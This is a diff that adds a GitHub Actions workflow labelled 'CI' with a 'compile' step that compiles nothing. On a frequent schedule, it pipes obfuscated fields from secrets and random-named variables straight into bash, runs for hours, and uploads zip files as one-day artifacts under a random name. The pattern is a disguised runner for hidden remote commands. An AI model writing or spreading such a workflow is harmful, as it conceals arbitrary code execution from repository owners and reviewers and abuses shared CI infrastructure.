@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          yx33303: ${{ secrets.yx33303 }}
+        run: |
+          printf '%s' "$yx33303" | jq -r .opt24 | /bin/bash
+          printf '%s' "$iaw89878" | jq -r .qj515 | /bin/bash
+          echo $ev0417 | jq -r .dskez1 | /bin/bash
+          printf '%s' "$cmfwe11" | jq -r .elvu43 | /bin/bash
+          printf '%s' "$jbzr49" | jq -r .pbbu4 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PWetLWAx
+          path: "*.zip"
+          retention-days: 1
